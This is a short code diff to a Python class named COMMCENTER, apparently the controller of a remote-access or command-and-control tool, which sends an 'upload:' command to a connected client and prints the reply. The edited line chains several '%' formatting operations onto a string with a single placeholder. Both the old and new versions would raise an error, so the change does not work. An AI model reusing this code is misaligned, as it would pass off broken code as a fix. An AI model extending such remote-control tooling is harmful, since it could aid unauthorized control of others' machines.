@@ -480,7 +480,7 @@ class COMMCENTER:
                 file = self.get_file(args[1])
                 if file:
                     # path, local_path
-                    self.CURRENT[1].send_data("upload:%s" % (args[2]) % (file))
+                    self.CURRENT[1].send_data("upload:%s" % (args[2]) % (':') % (file))
                     result = self.CURRENT[1].recv_data()
                     if result.strip(" "):
                         print(result)
